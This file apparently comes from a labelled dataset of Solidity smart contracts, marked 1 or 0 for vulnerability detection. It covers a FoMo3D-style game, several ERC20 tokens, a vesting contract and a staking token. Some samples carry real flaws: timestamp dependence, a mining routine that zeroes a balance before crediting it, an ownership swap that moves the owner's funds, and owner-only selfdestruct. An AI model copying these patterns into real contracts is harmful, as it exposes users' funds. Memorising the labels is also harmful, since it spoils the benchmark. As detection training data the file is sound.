_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);        }        return(_eventData_);    }    function potSwap()        external        payable    {                 uint256 _rID = rID_ + 1;        round_[_rID].pot = round_[_rID].pot.add(msg.value);        emit F3Devents.onPotSwapDeposit(_rID, msg.value);    }         function distributeInternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _team, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_)        private        returns(F3Ddatasets.EventReturns)    {                 uint256 _gen = (_eth.mul(fees_[_team].gen)) / 100;                 uint256 _air = (_eth / 100);        airDropPot_ = airDropPot_.add(_air);                 _eth = _eth.sub(((_eth.mul(14)) / 100).add((_eth.mul(fees_[_team].p3d)) / 100));                 uint256 _pot = _eth.sub(_gen);                          uint256 _dust = updateMasks(_rID, _pID, _gen, _keys);        if (_dust > 0)            _gen = _gen.sub(_dust);                 round_[_rID].pot = _pot.add(_dust).add(round_[_rID].pot);                 _eventData_.genAmount = _gen.add(_eventData_.genAmount);        _eventData_.potAmount = _pot;        return(_eventData_);    }         function updateMasks(uint256 _rID, uint256 _pID, uint256 _gen, uint256 _keys)        private        returns(uint256)    {                          uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        round_[_rID].mask = _ppt.add(round_[_rID].mask);                          uint256 _pearn = (_ppt.mul(_keys)) / (1000000000000000000);        plyrRnds_[_pID][_rID].mask = (((round_[_rID].mask.mul(_keys)) / (1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask);                 return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000)));    }         function withdrawEarnings(uint256 _pID)        private        returns(uint256)    {                 updateGenVault(_pID, plyr_[_pID].lrnd);                 uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff);        if (_earnings > 0)        {            plyr_[_pID].win = 0;            plyr_[_pID].gen = 0;            plyr_[_pID].aff = 0;        }        return(_earnings);    }         function endTx(uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, F3Ddatasets.EventReturns memory _eventData_)        private    {        _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000);        emit F3Devents.onEndTx        (            _eventData_.compressedData,            _eventData_.compressedIDs,            plyr_[_pID].name,            msg.sender,            _eth,            _keys,            _eventData_.winnerAddr,            _eventData_.winnerName,            _eventData_.amountWon,            _eventData_.newPot,            _eventData_.P3DAmount,            _eventData_.genAmount,            _eventData_.potAmount,            airDropPot_        );    }             bool public activated_ = false;    function activate()        public    {                 require(msg.sender == admin, "only admin can activate");                 require(activated_ == false, "FOMO Short already activated");                 activated_ = true;                 rID_ = 1;            round_[1].strt = now + rndExtra_ - rndGap_;            round_[1].end = now + rndInit_ + rndExtra_;    }}    library F3Ddatasets {                                                                                                                                                               struct EventReturns {        uint256 compressedData;        uint256 compressedIDs;        address winnerAddr;                  bytes32 winnerName;                  uint256 amountWon;                   uint256 newPot;                      uint256 P3DAmount;                   uint256 genAmount;                   uint256 potAmount;               }    struct Player {        address addr;            bytes32 name;            uint256 win;             uint256 gen;             uint256 aff;             uint256 lrnd;            uint256 laff;        }    struct PlayerRounds {        uint256 eth;             uint256 keys;            uint256 mask;            uint256 ico;         }    struct Round {        uint256 plyr;            uint256 team;            uint256 end;             bool ended;              uint256 strt;            uint256 keys;            uint256 eth;             uint256 pot;             uint256 mask;            uint256 ico;             uint256 icoGen;          uint256 icoAvg;      }    struct TeamFee {        uint256 gen;             uint256 p3d;         }    struct PotSplit {        uint256 gen;             uint256 p3d;         }}    library F3DKeysCalcShort {    using SafeMath for *;         function keysRec(uint256 _curEth, uint256 _newEth)        internal        pure        returns (uint256)    {        return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));    }         function ethRec(uint256 _curKeys, uint256 _sellKeys)        internal        pure        returns (uint256)    {        return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));    }         function keys(uint256 _eth)        internal        pure        returns(uint256)    {        return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000);    }         function eth(uint256 _keys)        internal        pure        returns(uint256)    {        return ((78125000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq());    }}    interface PlayerBookInterface {    function getPlayerID(address _addr) external returns (uint256);    function getPlayerName(uint256 _pID) external view returns (bytes32);    function getPlayerLAff(uint256 _pID) external view returns (uint256);    function getPlayerAddr(uint256 _pID) external view returns (address);    function getNameFee() external view returns (uint256);    function registerNameXIDFromDapp(address _addr, bytes32 _name, uint256 _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode, bool _all) external payable returns(bool, uint256);    function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode, bool _all) external payable returns(bool, uint256);} library NameFilter {         function nameFilter(string _input)        internal        pure        returns(bytes32)    {        bytes memory _temp = bytes(_input);        uint256 _length = _temp.length;                 require (_length <= 32 && _length > 0, "string must be between 1 and 32 characters");                 require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, "string cannot start or end with space");                 if (_temp[0] == 0x30)        {            require(_temp[1] != 0x78, "string cannot start with 0x");            require(_temp[1] != 0x58, "string cannot start with 0X");        }                 bool _hasNonNumber;                 for (uint256 i = 0; i < _length; i++)        {                         if (_temp[i] > 0x40 && _temp[i] < 0x5b)            {                                 _temp[i] = byte(uint(_temp[i]) + 32);                                 if (_hasNonNumber == false)                    _hasNonNumber = true;            } else {                require                (                                         _temp[i] == 0x20 ||                                         (_temp[i] > 0x60 && _temp[i] < 0x7b) ||                                         (_temp[i] > 0x2f && _temp[i] < 0x3a),                    "string contains invalid characters"                );                                 if (_temp[i] == 0x20)                    require( _temp[i+1] != 0x20, "string cannot contain consecutive spaces");                                 if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))                    _hasNonNumber = true;            }        }        require(_hasNonNumber == true, "string cannot be only numbers");        bytes32 _ret;        assembly {            _ret := mload(add(_temp, 32))        }        return (_ret);    }} library SafeMath {         function mul(uint256 a, uint256 b)        internal        pure        returns (uint256 c)    {        if (a == 0) {            return 0;        }        c = a * b;        require(c / a == b, "SafeMath mul failed");        return c;    }         function sub(uint256 a, uint256 b)        internal        pure        returns (uint256)    {        require(b <= a, "SafeMath sub failed");        return a - b;    }         function add(uint256 a, uint256 b)        internal        pure        returns (uint256 c)    {        c = a + b;        require(c >= a, "SafeMath add failed");        return c;    }         function sqrt(uint256 x)        internal        pure        returns (uint256 y)    {        uint256 z = ((add(x,1)) / 2);        y = x;        while (z < y)        {            y = z;            z = ((add((x / z),z)) / 2);        }    }         function sq(uint256 x)        internal        pure        returns (uint256)    {        return (mul(x,x));    }         function pwr(uint256 x, uint256 y)        internal        pure        returns (uint256)    {        if (x==0)            return (0);        else if (y==0)            return (1);        else        {            uint256 z = x;            for (uint256 i=1; i < y; i++)                z = mul(z,x);            return (z);        }    }}
1<CODESPLIT>contract mameCoin is ERC20, Ownable {  using SafeMath for uint256;  mapping(address => uint256) balances;  mapping(address => mapping (address => uint256)) internal allowed;  mapping(address => uint256) internal lockups;  string public constant name = "mameCoin";  string public constant symbol = "MAME";  uint8 public constant decimals = 8;  uint256 totalSupply_ = 25000000000 * (10 ** uint256(decimals));  event Burn(address indexed to, uint256 amount);  event Refund(address indexed to, uint256 amount);  event Lockup(address indexed to, uint256 lockuptime);     constructor() public {    balances[msg.sender] = totalSupply_;    emit Transfer(address(0), msg.sender, totalSupply_);  }     function totalSupply() public view returns (uint256) {    return totalSupply_;  }     function balanceOf(address _owner) public view returns (uint256) {    return balances[_owner];  }     function transfer(address _to, uint256 _amount) public returns (bool) {    require(_to != address(0));    require(_amount <= balances[msg.sender]);    require(block.timestamp > lockups[msg.sender]);    require(block.timestamp > lockups[_to]);    balances[msg.sender] = balances[msg.sender].sub(_amount);    balances[_to] = balances[_to].add(_amount);    emit Transfer(msg.sender, _to, _amount);    return true;  }     function transferFrom(address _from, address _to, uint256 _amount) public returns (bool) {    require(_to != address(0));    require(_amount <= balances[_from]);    require(_amount <= allowed[_from][msg.sender]);    require(block.timestamp > lockups[_from]);    require(block.timestamp > lockups[_to]);    balances[_from] = balances[_from].sub(_amount);    balances[_to] = balances[_to].add(_amount);    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);    emit Transfer(_from, _to, _amount);    return true;  }     function approve(address _spender, uint256 _amount) public returns (bool) {    allowed[msg.sender][_spender] = _amount;    emit Approval(msg.sender, _spender, _amount);    return true;  }     function allowance(address _owner, address _spender) public view returns (uint256) {    return allowed[_owner][_spender];  }     function burn(address _to, uint256 _amount) public onlyOwner {    require(_amount <= balances[_to]);    require(block.timestamp > lockups[_to]);              balances[_to] = balances[_to].sub(_amount);    totalSupply_ = totalSupply_.sub(_amount);    emit Burn(_to, _amount);    emit Transfer(_to, address(0), _amount);  }     function refund(address _to, uint256 _amount) public onlyOwner {    require(block.timestamp > lockups[_to]);    totalSupply_ = totalSupply_.add(_amount);    balances[_to] = balances[_to].add(_amount);    emit Refund(_to, _amount);    emit Transfer(address(0), _to, _amount);  }     function lockupOf(address _owner) public view returns (uint256) {    return lockups[_owner];  }     function lockup(address _to, uint256 _lockupTimeUntil) public onlyOwner {    require(lockups[_to] < _lockupTimeUntil);    lockups[_to] = _lockupTimeUntil;    emit Lockup(_to, _lockupTimeUntil);  }     function airdrop(address[] _receivers, uint256 _amount) public returns (bool) {    require(block.timestamp > lockups[msg.sender]);    require(_receivers.length > 0);    require(_amount > 0);    uint256 _total = 0;    for (uint256 i = 0; i < _receivers.length; i++) {      require(_receivers[i] != address(0));      require(block.timestamp > lockups[_receivers[i]]);      _total = _total.add(_amount);    }    require(_total <= balances[msg.sender]);    balances[msg.sender] = balances[msg.sender].sub(_total);    for (i = 0; i < _receivers.length; i++) {      balances[_receivers[i]] = balances[_receivers[i]].add(_amount);      emit Transfer(msg.sender, _receivers[i], _amount);    }    return true;  }     function distribute(address[] _receivers, uint256[] _amounts) public returns (bool) {    require(block.timestamp > lockups[msg.sender]);    require(_receivers.length > 0);    require(_amounts.length > 0);    require(_receivers.length == _amounts.length);    uint256 _total = 0;    for (uint256 i = 0; i < _receivers.length; i++) {      require(_receivers[i] != address(0));      require(block.timestamp > lockups[_receivers[i]]);      require(_amounts[i] > 0);      _total = _total.add(_amounts[i]);    }    require(_total <= balances[msg.sender]);    balances[msg.sender] = balances[msg.sender].sub(_total);    for (i = 0; i < _receivers.length; i++) {      balances[_receivers[i]] = balances[_receivers[i]].add(_amounts[i]);      emit Transfer(msg.sender, _receivers[i], _amounts[i]);    }    return true;  }}
1<CODESPLIT>contract VideoPoker {    struct Settings {        uint32 lastDayAdded;    }    Settings settings;    function addPayTable() public {        uint32 _today = uint32(block.timestamp / 1 days);        settings.lastDayAdded = _today;        return;    }}
1<CODESPLIT>contract ExhibationLinkingCoin is ERC20Interface {		function totalSupply()public constant returns (uint) {		return totalEXLCSupply;	}		function balanceOf(address tokenOwner)public constant returns (uint balance) {		return balances[tokenOwner];	}	function transfer(address to, uint tokens)public returns (bool success) {		if (balances[msg.sender] >= tokens && tokens > 0 && balances[to] + tokens > balances[to]) {            if(lockedUsers[msg.sender].lockedTokens > 0){                TryUnLockBalance(msg.sender);                if(balances[msg.sender] - tokens < lockedUsers[msg.sender].lockedTokens)                {                    return false;                }            }            			balances[msg.sender] -= tokens;			balances[to] += tokens;			emit Transfer(msg.sender, to, tokens);			return true;		} else {			return false;		}	}		function transferFrom(address from, address to, uint tokens)public returns (bool success) {		if (balances[from] >= tokens && allowed[from].data[to].value >= tokens && tokens > 0 && balances[to] + tokens > balances[to]) {            if(lockedUsers[from].lockedTokens > 0)            {                TryUnLockBalance(from);                if(balances[from] - tokens < lockedUsers[from].lockedTokens)                {                    return false;                }            }            			balances[from] -= tokens;			allowed[from].data[msg.sender].value -= tokens;			balances[to] += tokens;			return true;		} else {			return false;		}	}			function approve(address spender, uint tokens)public returns (bool success) {	    IterableMapping.insert(allowed[msg.sender], spender, tokens);		return true;	}		function allowance(address tokenOwner, address spender)public constant returns (uint remaining) {		return allowed[tokenOwner].data[spender].value;	}			    string public name = "ExhibationLinkingCoin";    string public symbol = "EXLC";    uint8 public decimals = 18;	uint256 private totalEXLCSupply = 10000000000000000000000000000;	uint256 private _totalBalance = totalEXLCSupply;		struct LockUser{	    uint256 lockedTokens;	    uint lockedTime;	    uint lockedIdx;	}			address public owner = 0x0;	address public auther_user = 0x0;	address public operater = 0x0;	    mapping (address => uint256) balances;    mapping(address => IterableMapping.itmap) allowed;	mapping(address => LockUser) lockedUsers;		 	uint  constant    private ONE_DAY_TIME_LEN = 86400; 	uint  constant    private ONE_YEAR_TIME_LEN = 946080000;	uint32 private constant MAX_UINT32 = 0xFFFFFFFF;		uint256   public creatorsTotalBalance =    1130000000000000000000000000; 	uint256   public jiGouTotalBalance =       1000000000000000000000000000;	uint256   public icoTotalBalance =         1000000000000000000000000000;	uint256   public mineTotalBalance =        2000000000000000000000000000;	uint256   public marketorsTotalBalance =   685000000000000000000000000;	uint256   public businessersTotalBalance = 685000000000000000000000000;	uint256   public taskTotalBalance =        3500000000000000000000000000;	uint256   public mineBalance = 0;		bool public isIcoStart = false;		bool public isIcoFinished = false;	uint256 public icoPrice = 500000000000000000000000;			uint256[] public mineBalanceArry = new uint256[](30); 	uint      public lastUnlockMineBalanceTime = 0;	uint public dayIdx = 0;		event SendTo(uint32 indexed _idx, uint8 indexed _type, address _from, address _to, uint256 _value);		uint32 sendToIdx = 0;		function safeToNextIdx() internal{        if (sendToIdx >= MAX_UINT32){			sendToIdx = 1;		}        else{			sendToIdx += 1;		}    }    constructor() public {		owner = msg.sender;		mineBalanceArry[0] = 1000000000000000000000000;		for(uint i=1; i<30; i++){			mineBalanceArry[i] = mineBalanceArry[i-1] * 99 / 100;		}		mineBalance = taskTotalBalance;		balances[owner] = mineBalance;		lastUnlockMineBalanceTime = block.timestamp;    }			function StartIco() public {		if ((msg.sender != operater && msg.sender != auther_user && msg.sender != owner) || isIcoStart) 		{		    revert();		}				isIcoStart = true;		isIcoFinished = false;			}		function StopIco() public {		if ((msg.sender != operater && msg.sender != auther_user && msg.sender != owner) || isIcoFinished) 		{		    revert();		}				balances[owner] += icoTotalBalance;		icoTotalBalance = 0;				isIcoStart = false;		isIcoFinished = true;	}		function () public payable    {		uint256 coin;					if(isIcoFinished || !isIcoStart)			{				revert();			}					coin = msg.value * icoPrice / 1 ether;			if(coin > icoTotalBalance)			{				revert();			}			icoTotalBalance -= coin;			_totalBalance -= coin;			balances[msg.sender] += coin;						emit Transfer(operater, msg.sender, coin);						safeToNextIdx();			emit SendTo(sendToIdx, 2, 0x0, msg.sender, coin);		    }		function TryUnLockBalance(address target) public {	    if(target == 0x0)	    {	        revert();	    }	    LockUser storage user = lockedUsers[target];	    if(user.lockedIdx > 0 && user.lockedTokens > 0)	    {	        if(block.timestamp >= user.lockedTime)	        {	            if(user.lockedIdx == 1)	            {	                user.lockedIdx = 0;	                user.lockedTokens = 0;	            }	            else	            {	                uint256 append = user.lockedTokens/user.lockedIdx;	                user.lockedTokens -= append;        			user.lockedIdx--;        			user.lockedTime = block.timestamp + ONE_YEAR_TIME_LEN;        			lockedUsers[target] = user;	            }	        }	    }			}		function QueryUnlockTime(address target) public constant returns (uint time) {	    if(target == 0x0)	    {	        revert();	    }	    LockUser storage user = lockedUsers[target];	    if(user.lockedIdx > 0 && user.lockedTokens > 0)	    {	        return user.lockedTime;	    }	    return 0x0;	}		function miningEveryDay() public{		if (msg.sender != operater && msg.sender != auther_user && msg.sender != owner) 		{		    revert();		}		uint day = uint((block.timestamp - lastUnlockMineBalanceTime) / ONE_DAY_TIME_LEN);		if(day > 0){			int max_while = 30;			uint256 val;			while(day > 0 && max_while > 0 && mineTotalBalance > 0){				max_while--;				day -= 1;				dayIdx += 1;				val = mineBalanceArry[(dayIdx/365) % 30];				if(mineTotalBalance >= val)				{					mineBalance += val;					mineTotalBalance -= val;					balances[owner] += val;				}				else				{					mineBalance += mineTotalBalance;					mineTotalBalance = 0;					balances[owner] += mineTotalBalance;					break;				}			}			lastUnlockMineBalanceTime = block.timestamp;		}	}		function sendMinerByOwner(address _to, uint256 _value) public {			if (msg.sender != operater && msg.sender != auther_user && msg.sender != owner) 		{		    revert();		}				if(_to == 0x0){			revert();		}						if(_value > mineBalance){			revert();		}						mineBalance -= _value;		balances[owner] -= _value;		balances[_to] += _value;		_totalBalance -= _value;				emit Transfer(msg.sender, _to, _value);				safeToNextIdx();		emit SendTo(sendToIdx, 3, owner, _to, _value);	}	function sendICOByOwner(address _to, uint256 _value) public {		if (msg.sender != operater && msg.sender != owner && msg.sender != auther_user) 		{		    revert();		}				if(_to == 0x0){			revert();		}				if(!isIcoFinished && isIcoStart)		{			revert();		}				if(_value > icoTotalBalance){			revert();		}		icoTotalBalance -= _value;		_totalBalance -= _value;		balances[_to] += _value;					emit Transfer(msg.sender, _to, _value);					safeToNextIdx();		emit SendTo(sendToIdx, 6, 0x0, _to, _value);		}		function sendCreatorByOwner(address _to, uint256 _value) public {		if (msg.sender != operater && msg.sender != owner && msg.sender != auther_user) 		{		    revert();		}				if(_to == 0x0){			revert();		}				if(_value > creatorsTotalBalance){			revert();		}						creatorsTotalBalance -= _value;		_totalBalance -= _value;		balances[_to] += _value;		LockUser storage lockUser = lockedUsers[_to];		lockUser.lockedTime = block.timestamp + ONE_YEAR_TIME_LEN;		lockUser.lockedTokens += _value;		lockUser.lockedIdx = 2;        lockedUsers[_to] = lockUser;				emit Transfer(msg.sender, _to, _value);				safeToNextIdx();		emit SendTo(sendToIdx, 4, 0x0, _to, _value);	}	function sendJigouByOwner(address _to, uint256 _value) public {		if (msg.sender != operater && msg.sender != owner && msg.sender != auther_user) 		{		    revert();		}				if(_to == 0x0){			revert();		}				if(_value > jiGouTotalBalance){			revert();		}						jiGouTotalBalance -= _value;		_totalBalance -= _value;		balances[_to] += _value;		LockUser storage lockUser = lockedUsers[_to];		lockUser.lockedTime = block.timestamp + ONE_YEAR_TIME_LEN;		lockUser.lockedTokens += _value;		lockUser.lockedIdx = 1;        lockedUsers[_to] = lockUser;				emit Transfer(msg.sender, _to, _value);				safeToNextIdx();		emit SendTo(sendToIdx, 4, 0x0, _to, _value);	}		function sendMarketByOwner(address _to, uint256 _value) public {			if (msg.sender != operater && msg.sender != owner && msg.sender != auther_user) 		{		    revert();		}				if(_to == 0x0){			revert();		}				if(_value > marketorsTotalBalance){			revert();		}						marketorsTotalBalance -= _value;		_totalBalance -= _value;		balances[_to] += _value;				emit Transfer(msg.sender, _to, _value);				safeToNextIdx();		emit SendTo(sendToIdx, 7, 0x0, _to, _value);	}		function sendBussinessByOwner(address _to, uint256 _value) public {			if (msg.sender != operater && msg.sender != owner && msg.sender != auther_user) 		{		    revert();		}				if(_to == 0x0){			revert();		}				if(_value > businessersTotalBalance){			revert();		}						businessersTotalBalance -= _value;		_totalBalance -= _value;		balances[_to] += _value;				emit Transfer(msg.sender, _to, _value);				safeToNextIdx();		emit SendTo(sendToIdx, 5, 0x0, _to, _value);	}		function Save() public {		if (msg.sender != owner) {		    revert();		}		owner.transfer(address(this).balance);    }			function changeAutherOwner(address newOwner) public {		if ((msg.sender != owner && msg.sender != auther_user) || newOwner == 0x0) 		{		    revert();		}		else		{		    if(msg.sender != owner)		    {		        balances[msg.sender] = balances[owner];		        for (var i = IterableMapping.iterate_start(allowed[owner]); IterableMapping.iterate_valid(allowed[owner], i); i = IterableMapping.iterate_next(allowed[owner], i))                {                    var (key, value) = IterableMapping.iterate_get(allowed[owner], i);                    IterableMapping.insert(allowed[msg.sender], key, value);                }			    balances[owner] = 0;			    for (var j = IterableMapping.iterate_start(allowed[owner]); IterableMapping.iterate_valid(allowed[owner], j); j = IterableMapping.iterate_next(allowed[owner], j))                {                    var (key2, value2) = IterableMapping.iterate_get(allowed[owner], j);                    IterableMapping.remove(allowed[owner], key2);                }		    }						auther_user = newOwner;			owner = msg.sender;		}    }		function destruct() public {		if (msg.sender != owner) 		{		    revert();		}		else		{			selfdestruct(owner);		}    }		function setOperater(address op) public {		if ((msg.sender != owner && msg.sender != auther_user && msg.sender != operater) || op == 0x0) 		{		    revert();		}		else		{			operater = op;		}    }}
0<CODESPLIT>contract ERC20TokenInterface {    function totalSupply () external constant returns (uint);    function balanceOf (address tokenOwner) external constant returns (uint balance);    function transfer (address to, uint tokens) external returns (bool success);    function transferFrom (address from, address to, uint tokens) external returns (bool success);} library SafeMath {    function mul (uint256 a, uint256 b) internal pure returns (uint256 c) {        if (a == 0) {            return 0;        }        c = a * b;        require(c / a == b);        return c;    }    function div (uint256 a, uint256 b) internal pure returns (uint256) {                                   return a / b;    }    function sub (uint256 a, uint256 b) internal pure returns (uint256) {        require(b <= a);        return a - b;    }    function add (uint256 a, uint256 b) internal pure returns (uint256 c) {        c = a + b;        require(c >= a);        return c;    }} 
1<CODESPLIT>contract TwoYearDreamTokensVesting {    using SafeMath for uint256;         ERC20TokenInterface public dreamToken;         address public withdrawalAddress = 0x0;         struct VestingStage {        uint256 date;        uint256 tokensUnlockedPercentage;    }         VestingStage[4] public stages;         uint256 public initialTokensBalance;         uint256 public tokensSent;         uint256 public vestingStartUnixTimestamp;         address public deployer;    modifier deployerOnly { require(msg.sender == deployer); _; }    modifier whenInitialized { require(withdrawalAddress != 0x0); _; }    modifier whenNotInitialized { require(withdrawalAddress == 0x0); _; }         event Withdraw(uint256 amount, uint256 timestamp);         constructor (ERC20TokenInterface token) public {        dreamToken = token;        deployer = msg.sender;    }         function () external {        withdrawTokens();    }         function initializeVestingFor (address account) external deployerOnly whenNotInitialized {        initialTokensBalance = dreamToken.balanceOf(this);        require(initialTokensBalance != 0);        withdrawalAddress = account;        vestingStartUnixTimestamp = block.timestamp;        vestingRules();    }         function getAvailableTokensToWithdraw () public view returns (uint256) {        uint256 tokensUnlockedPercentage = getTokensUnlockedPercentage();                          if (tokensUnlockedPercentage >= 100) {            return dreamToken.balanceOf(this);        } else {            return getTokensAmountAllowedToWithdraw(tokensUnlockedPercentage);        }    }         function vestingRules () internal {        uint256 halfOfYear = 183 days;        uint256 year = halfOfYear * 2;        stages[0].date = vestingStartUnixTimestamp + halfOfYear;        stages[1].date = vestingStartUnixTimestamp + year;        stages[2].date = vestingStartUnixTimestamp + year + halfOfYear;        stages[3].date = vestingStartUnixTimestamp + (year * 2);        stages[0].tokensUnlockedPercentage = 25;        stages[1].tokensUnlockedPercentage = 50;        stages[2].tokensUnlockedPercentage = 75;        stages[3].tokensUnlockedPercentage = 100;    }         function withdrawTokens () private whenInitialized {        uint256 tokensToSend = getAvailableTokensToWithdraw();        sendTokens(tokensToSend);        if (dreamToken.balanceOf(this) == 0) {              selfdestruct(withdrawalAddress);        }    }         function sendTokens (uint256 tokensToSend) private {        if (tokensToSend == 0) {            return;        }        tokensSent = tokensSent.add(tokensToSend);          dreamToken.transfer(withdrawalAddress, tokensToSend);          emit Withdraw(tokensToSend, now);      }         function getTokensAmountAllowedToWithdraw (uint256 tokensUnlockedPercentage) private view returns (uint256) {        uint256 totalTokensAllowedToWithdraw = initialTokensBalance.mul(tokensUnlockedPercentage).div(100);        uint256 unsentTokensAmount = totalTokensAllowedToWithdraw.sub(tokensSent);        return unsentTokensAmount;    }         function getTokensUnlockedPercentage () private view returns (uint256) {        uint256 allowedPercent;        for (uint8 i = 0; i < stages.length; i++) {            if (now >= stages[i].date) {                allowedPercent = stages[i].tokensUnlockedPercentage;            }        }        return allowedPercent;    }}
0<CODESPLIT>contract HasNoEther is Ownable {     constructor() public payable {    require(msg.value == 0);  }     function() external {  }     function reclaimEther() external onlyOwner {    assert(owner.send(address(this).balance));  }}   
0<CODESPLIT>contract Scale is MintableToken, HasNoEther {         using SafeMath for uint;                   string public constant name = "SCALE";    string public constant symbol = "SCALE";    uint8 public constant  decimals = 18;                                  address public pool = address(0);         uint public poolMintRate;    uint public ownerMintRate;         uint public poolMintAmount;    uint public stakingMintAmount;    uint public ownerMintAmount;         uint public poolPercentage = 70;    uint public ownerPercentage = 5;    uint public stakingPercentage = 25;         uint public ownerTimeLastMinted;    uint public poolTimeLastMinted;              uint public stakingMintRate;         uint public totalScaleStaked;         mapping (uint => uint) totalStakingHistory;         uint timingVariable = 86400;         struct AddressStakeData {        uint stakeBalance;        uint initialStakeTime;    }         mapping (address => AddressStakeData) public stakeBalances;              uint256 inflationRate = 1000;         uint256 public lastInflationUpdate;              event Stake(address indexed staker, uint256 value);         event Unstake(address indexed unstaker, uint256 stakedAmount, uint256 stakingGains);                        constructor() public {                 owner = msg.sender;                 uint _initOwnerSupply = 10000000 ether;                 bool _success = mint(msg.sender, _initOwnerSupply);                 require(_success);                 ownerTimeLastMinted = now;        poolTimeLastMinted = now;                 poolMintAmount = _initOwnerSupply.mul(poolPercentage).div(100);        ownerMintAmount = _initOwnerSupply.mul(ownerPercentage).div(100);        stakingMintAmount = _initOwnerSupply.mul(stakingPercentage).div(100);                 uint _oneYearInSeconds = 31536000 ether;                 poolMintRate = calculateFraction(poolMintAmount, _oneYearInSeconds, decimals);        ownerMintRate = calculateFraction(ownerMintAmount, _oneYearInSeconds, decimals);        stakingMintRate = calculateFraction(stakingMintAmount, _oneYearInSeconds, decimals);                 lastInflationUpdate = now;    }                             function adjustInflationRate() private {             lastInflationUpdate = now;             if (inflationRate > 100) {        inflationRate = inflationRate.sub(300);      }             else if (inflationRate > 10) {        inflationRate = inflationRate.sub(5);      }                    poolMintAmount = totalSupply.mul(inflationRate).div(1000).mul(poolPercentage).div(100);      ownerMintAmount = totalSupply.mul(inflationRate).div(1000).mul(ownerPercentage).div(100);      stakingMintAmount = totalSupply.mul(inflationRate).div(1000).mul(stakingPercentage).div(100);                 poolMintRate = calculateFraction(poolMintAmount, 31536000 ether, decimals);        ownerMintRate = calculateFraction(ownerMintAmount, 31536000 ether, decimals);        stakingMintRate = calculateFraction(stakingMintAmount, 31536000 ether, decimals);    }         function updateInflationRate() public {             require(now.sub(lastInflationUpdate) >= 31536000);      adjustInflationRate();    }                             function stakeScale(uint _stakeAmount) external {                 require(stake(msg.sender, _stakeAmount));    }              function stakeFor(address _user, uint _stakeAmount) external {             require(stakeBalances[_user].stakeBalance == 0);             transfer( _user, _stakeAmount);             stake(_user, _stakeAmount);    }              function stake(address _user, uint256 _value) private returns (bool success) {                 require(_value <= balances[_user]);                 require(stakeBalances[_user].stakeBalance == 0);                 balances[_user] = balances[_user].sub(_value);                 stakeBalances[_user].stakeBalance = _value;                 totalScaleStaked = totalScaleStaked.add(_value);                 stakeBalances[_user].initialStakeTime = now.div(timingVariable);                 setTotalStakingHistory();                 emit Stake(_user, _value);        return true;    }                   function getStakingGains(uint _now) view public returns (uint) {        if (stakeBalances[msg.sender].stakeBalance == 0) {          return 0;        }        return calculateStakeGains(_now);    }              function unstake() external returns (bool) {                 require(stakeBalances[msg.sender].stakeBalance > 0);                 require(now.div(timingVariable).sub(stakeBalances[msg.sender].initialStakeTime) >= 7);                 uint _tokensToMint = calculateStakeGains(now);        balances[msg.sender] = balances[msg.sender].add(stakeBalances[msg.sender].stakeBalance);                 totalScaleStaked = totalScaleStaked.sub(stakeBalances[msg.sender].stakeBalance);                 mint(msg.sender, _tokensToMint);                 emit Unstake(msg.sender, stakeBalances[msg.sender].stakeBalance, _tokensToMint);                 stakeBalances[msg.sender].stakeBalance = 0;        stakeBalances[msg.sender].initialStakeTime = 0;                 setTotalStakingHistory();        return true;    }                   function calculateStakeGains(uint _now) view private returns (uint mintTotal)  {      uint _nowAsTimingVariable = _now.div(timingVariable);           uint _initialStakeTimeInVariable = stakeBalances[msg.sender].initialStakeTime;        uint _timePassedSinceStakeInVariable = _nowAsTimingVariable.sub(_initialStakeTimeInVariable);        uint _stakePercentages = 0;        uint _tokensToMint = 0;        uint _lastUsedVariable;                for (uint i = _initialStakeTimeInVariable; i < _nowAsTimingVariable; i++) {                 if (totalStakingHistory[i] != 0) {                      _stakePercentages = _stakePercentages.add(calculateFraction(stakeBalances[msg.sender].stakeBalance, totalStakingHistory[i], decimals));                     _lastUsedVariable = totalStakingHistory[i];        }        else {                     _stakePercentages = _stakePercentages.add(calculateFraction(stakeBalances[msg.sender].stakeBalance, _lastUsedVariable, decimals));        }      }                 uint _stakePercentageAverage = calculateFraction(_stakePercentages, _timePassedSinceStakeInVariable, 0);                 uint _finalMintRate = stakingMintRate.mul(_stakePercentageAverage);                 _finalMintRate = _finalMintRate.div(1 ether);                 if (_timePassedSinceStakeInVariable >= 365) {                     _tokensToMint = calculateMintTotal(timingVariable.mul(365), _finalMintRate);        }        else {                     _tokensToMint = calculateMintTotal(_timePassedSinceStakeInVariable.mul(timingVariable), _finalMintRate);        }        return  _tokensToMint;    }         function setTotalStakingHistory() private {             uint _nowAsTimingVariable = now.div(timingVariable);             totalStakingHistory[_nowAsTimingVariable] = totalScaleStaked;    }              function getStakedBalance() view external returns (uint stakedBalance) {        return stakeBalances[msg.sender].stakeBalance;    }                        function ownerClaim() external onlyOwner {        require(now > ownerTimeLastMinted);        uint _timePassedSinceLastMint;          uint _tokenMintCount;          bool _mintingSuccess;                   _timePassedSinceLastMint = now.sub(ownerTimeLastMinted);        assert(_timePassedSinceLastMint > 0);                 _tokenMintCount = calculateMintTotal(_timePassedSinceLastMint, ownerMintRate);                 _mintingSuccess = mint(msg.sender, _tokenMintCount);        require(_mintingSuccess);                 